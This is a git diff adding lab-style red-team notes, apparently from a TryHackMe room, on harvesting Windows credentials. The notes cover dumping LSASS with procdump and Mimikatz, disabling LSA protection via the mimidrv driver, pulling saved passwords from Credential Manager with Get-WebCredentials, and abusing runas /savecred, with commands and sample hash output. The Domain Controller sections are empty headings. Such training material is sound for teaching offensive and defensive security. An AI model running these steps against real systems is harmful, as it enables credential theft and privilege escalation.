@@ -114,18 +114,13 @@ Local Windows
   - [Sysinternals Suite](#Sysinternals-Suite)
   - [MimiKatz](#MimiKatz)
   - [Protected LSASS](#Protected-LSASS)
-- [](#)
-  - [](#)
-  - [](#)
-  - [](#)
-  - [](#)
-  - [](#)
-- [](#)
-  - [](#)
-  - [](#)
-  - [](#)
-  - [](#)
-  - [](#)
+- [Windows Credential Manager](#Windows-Credential-Manager)
+  - [What is Credentials Manager](#What-is-Credentials-Manager)
+  - [Accessing Credential Manager](#Accessing-Credential-Manager)
+  - [Credential Dumping](#Credential-Dumping)
+  - [RunAs](#RunAs)
+  - [local Mimikatz](#local Mimikatz)
+
 - [](#)
   - [](#)
   - [](#)
@@ -260,7 +255,12 @@ Active Directory
   - [genericpotato](#genericpotato)
   - [printnightmare](#printnightmare)
 ------------------------------------------------------------------------------------
-
+- [Domain Controller cred dump](#Domain-Controller)
+  - [NTDS Domain Controller](#NTDS-Domain-Controller)
+  - [Ntdsutil](#Ntdsutil)
+  - [Local Dumping No Credentials](#Local-Dumping-No-Credentials)
+  - [Remote Dumping With Credentials](#Remote-Dumping-With-Credentials)
+  - [DC Sync](#DC-Sync)
 
 
 
@@ -2106,6 +2106,234 @@ Note if we compare the output against the NTLM hashes we got from Metasploit's H
 Once we obtain NTLM hashes, we can try to crack them using Hashcat if they are guessable, or we can use different techniques to impersonate users using the hashes.
 
 
+#### Local Security Authority Subsystem Service LSASS
+
+### What is the LSASS
+Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects.
+
+Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. Luckily for us, if we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as "OS Credential Dumping: LSASS Memory (T1003)".
+```
+https://attack.mitre.org/techniques/T1003/001/
+```
+
+### Graphic User Interface GUI
+To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".
+![image](https://user-images.githubusercontent.com/24814781/189446114-cf5d88ac-43f5-49dc-b6d9-46b970d08aa0.png)
+
+Once the dumping process is finished, a pop-up message will show containing the path of the dumped file. Now copy the file and transfer it to the AttackBox to extract NTLM hashes offline. 
+
+### Sysinternals Suite
+An alternative way to dump a process if a GUI is not available to us is by using ProcDump. ProcDump is a Sysinternals process dump utility that runs from the command prompt. The SysInternals Suite is already installed in the provided machine at the following path: c:\Tools\SysinternalsSuite obs: in this demo/example
+
+We can specify a running process, which in our case is lsass.exe, to be dumped as follows,
+```
+c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
+
+ProcDump v10.0 - Sysinternals process dump utility
+Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[09:09:33] Dump 1 initiated: c:\Tools\Mimikatz\lsass_dump-1.dmp
+[09:09:33] Dump 1 writing: Estimated dump file size is 162 MB.
+[09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds
+```
+Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products.
+
+### MimiKatz
+
+Mimikatz 
+```
+https://github.com/gentilkiwi/mimikatz
+```
+is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information. Thus, it requires administrator and system privileges in order to dump memory and extract credentials.
+
+We will be using the Mimikatz tool to extract the memory dump of the lsass.exe process. 
+
+Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a system or local administrator permissions. Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows,
+```
+C:\Tools\Mimikatz> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # 
+```
+
+Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. It can be done by executing privilege::debug command as follows,
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+```
+
+Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the lsass.exe process using sekurlsa::logonpasswords. If we try this on the provided VM, it will not work until we fix it in the next section.
+
+```
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 515377 (00000000:0007dd31)
+Session           : RemoteInteractive from 3
+User Name         : Administrator
+Domain            : THM
+Logon Server      : CREDS-HARVESTIN
+Logon Time        : 6/3/2022 8:30:44 AM
+SID               : S-1-5-21-1966530601-3185510712-10604624-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : THM
+         * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261
+         * SHA1     : 64a137cb8178b7700e6cffa387f4240043192e72
+         * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70
+...
+```
+
+Mimikatz lists a lot of information about accounts and machines. If we check closely in the Primary section for Administrator users, we can see that we have an NTLM hash. 
+
+Note to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.
+
+### Protected LSASS
+
+In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa to 1.
+
+The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.
+
+```
+mimikatz # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+```
+The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,
+```
+mimikatz # !+
+[*] 'mimidrv' service not present
+[+] 'mimidrv' service successfully registered
+[+] 'mimidrv' service ACL to everyone
+[+] 'mimidrv' service started
+```
+
+Note: If this fails with an isFileExist error, exit mimikatz, navigate to the mimikatz folder/path and run the command again.
+
+Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:
+```
+mimikatz # !processprotect /process:lsass.exe /remove
+Process : lsass.exe
+PID 528 -> 00/00 [0-0-0]
+```
+
+Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.
+
+
+### Windows Credential Manager
+
+This task introduces the Windows Credential Manager and discusses the technique used for dumping system credentials by exploiting it.
+
+### What is Credentials Manager
+
+Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories:
+
+*    Web credentials contain authentication details stored in Internet browsers or other applications.
+*    Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
+*    Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
+*    Certificate-based credentials: Athunticated details based on certifications.
+
+Note that authentication details are stored on the user's folder and are not shared among Windows user accounts. However, they are cached in memory.
+
+
+### Accessing Credential Manager
+
+We can access the Windows Credential Manager through GUI (Control Panel -> User Accounts -> Credential Manager) or the command prompt. In this task, the focus will be more on the command prompt scenario where the GUI is not available.
+
+![image](https://user-images.githubusercontent.com/24814781/189448879-86098697-e5fb-4535-b84a-accd23c2c353.png)
+
+We will be using the Microsoft Credentials Manager vaultcmd utility. Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults available in the Windows target. 
+
+```
+C:\Users\Administrator>vaultcmd /list
+Currently loaded vaults:
+        Vault: Web Credentials
+        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+
+        Vault: Windows Credentials
+        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
+        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
+```
+By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above output confirms that we have the two default vaults.
+
+Let's check if there are any stored credentials in the Web Credentials vault by running the vaultcmd command with /listproperties.
+
+```
+C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
+Vault Properties: Web Credentials
+Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+Number of credentials: 1
+Current protection method: DPAPI
+```
+The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential as follows,
+
+```
+C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
+Credentials in vault: Web Credentials
+
+Credential schema: Windows Web Password Credential
+Resource: internal-app.thm.red
+Identity: THMUser Saved By: MSEdge
+Hidden: No
+Roaming: Yes
+```
+
+### Credential Dumping
+
+The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as Get-WebCredentials.ps1,
+```
+https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
+```
+
+Ensure to execute PowerShell with bypass policy to import it as a module as follows,
+```
+C:\Users\Administrator>powershell -ex bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
+PS C:\Users\Administrator> Get-WebCredentials
+
+UserName  Resource             Password     Properties
+--------  --------             --------     ----------
+THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
+```
+
+The output shows that we obtained the username and password for accessing the internal application.
+
+
+### RunAs
+
+An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions. The RunAs tool has various command arguments that could be used in the Windows system. The /savecred argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.
+
+Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using cmdkey, which is a tool to create, delete, and display stored Windows credentials. By providing the /list argument, we can show all stored credentials, or we can specify the credential to display more details /list:computername.
+
+```
+C:\Users\thm>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=thm\thm-local
+    Type: Domain Password
+    User: thm\thm-local
+```
+
+The output shows that we have a domain password stored as the thm\thm-local user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the thm-local user.
+
+```
+C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
+Attempting to start cmd.exe as user "THM.red\thm-local" ...
+```
+
+
+A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are running under the desired user. There is a flag in the c:\Users\thm-local\Saved Games\flag.txt, try to read it and answer the question below.
 
 
 ----------------------------------------------------------------------------------------------------------------------------------
@@ -5738,3 +5966,15 @@ Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
 Run the command "whoami /groups" in the new window. You should see "BUILTIN\Administrators" in the list of groups, and a line at the bottom of the output containing "Mandatory Label\High Mandatory Level".
   
 
+-----------------------------------------------------------------------------------------------------------------------------
+### local Domain Controller
+
+### NTDS Domain Controller
+
+### Ntdsutil
+
+### Local Dumping No Credentials
+
+### Remote Dumping With Credentials
+
+### DC Sync
